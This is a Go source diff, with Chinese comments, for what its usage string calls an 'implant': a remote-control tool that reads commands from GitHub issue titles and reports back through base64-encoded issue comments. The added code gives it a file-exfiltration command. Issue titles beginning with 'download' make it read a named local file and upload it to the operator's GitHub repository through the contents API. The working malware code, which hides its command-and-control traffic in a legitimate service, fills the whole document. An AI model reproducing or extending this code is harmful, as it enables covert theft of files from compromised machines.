@@ -24,11 +24,6 @@ type Issue struct {
 	Number int `json:"number"` // Issue 编号
 }
 
-type GitHubFileContent struct {
-	Content  string `json:"content"`
-	Encoding string `json:"encoding"`
-}
-
 // 获取当前仓库的最晚 issue 编号，倒序
 func GetOldestIssueNumber(token, owner, repo string) (int, error) {
 	// 将 direction=desc 改为 direction=asc，以获取最早的 issue
@@ -251,6 +246,58 @@ func downloadFile(token, user, repo, remoteFilePath string) error {
 	return nil
 }
 
+// 上传本地文件到github仓库
+func uploadFile(token, user, repo, localFilePath, remoteFileName string) error {
+	// 读取本地文件内容
+	content, err := ioutil.ReadFile(localFilePath)
+	if err != nil {
+		return fmt.Errorf("failed to read file: %v", err)
+	}
+
+	// 将文件内容进行 Base64 编码
+	encodedContent := base64.StdEncoding.EncodeToString(content)
+
+	// 构造 GitHub API 的 URL
+	url := fmt.Sprintf("https://api.github.com/repos/%s/%s/contents/%s", user, repo, remoteFileName)
+
+	// 构造提交信息
+	requestBody, err := json.Marshal(map[string]string{
+		"message": "Add " + remoteFileName + " via API",
+		"content": encodedContent,
+	})
+	if err != nil {
+		return fmt.Errorf("failed to marshal request body: %v", err)
+	}
+
+	// 构造 HTTP 请求
+	req, err := http.NewRequest("PUT", url, bytes.NewBuffer(requestBody))
+	if err != nil {
+		return fmt.Errorf("failed to create request: %v", err)
+	}
+
+	// 设置请求头
+	req.Header.Set("Authorization", "token "+token)
+	req.Header.Set("Accept", "application/vnd.github.v3+json")
+
+	// 发送请求
+	client := &http.Client{}
+	resp, err := client.Do(req)
+	if err != nil {
+		return fmt.Errorf("failed to send request: %v", err)
+	}
+	defer resp.Body.Close()
+
+	// 处理响应
+	if resp.StatusCode == http.StatusCreated {
+		fmt.Println(fmt.Sprintf("upload local file %s to github success...", localFilePath))
+	} else {
+		body, _ := ioutil.ReadAll(resp.Body)
+		return fmt.Errorf("failed to upload file: %s", string(body))
+	}
+
+	return nil
+}
+
 func main() {
 	if len(os.Args) < 4 {
 		fmt.Println("Usage: implant <AccessToken> <Username> <Repository>")
@@ -327,6 +374,27 @@ func main() {
 				}
 			} else {
 				//fmt.Println("download github file success")
+				result := "upload success"
+				encoded := base64Encode(result)
+				if err := PostComment(token, owner, repo, issueNbrStr, encoded); err != nil {
+					fmt.Println(fmt.Errorf("Failed to post comment: %v", err))
+				}
+			}
+		}
+
+		if title != "" && strings.HasPrefix(title, "download") {
+			args := strings.Fields(title)
+			implant_file_path := args[1]
+			remote_file_name := args[2]
+			if err := uploadFile(token, owner, repo, implant_file_path, remote_file_name); err != nil {
+				fmt.Println("upload implant file", implant_file_path, "to github Error")
+				result := "upload failed"
+				encoded := base64Encode(result)
+				if err := PostComment(token, owner, repo, issueNbrStr, encoded); err != nil {
+					fmt.Println(fmt.Errorf("Failed to post comment: %v", err))
+				}
+			} else {
+				fmt.Println("upload implant file", implant_file_path, "to github success")
 				result := "upload success"
 				encoded := base64Encode(result)
 				if err := PostComment(token, owner, repo, issueNbrStr, encoded); err != nil {
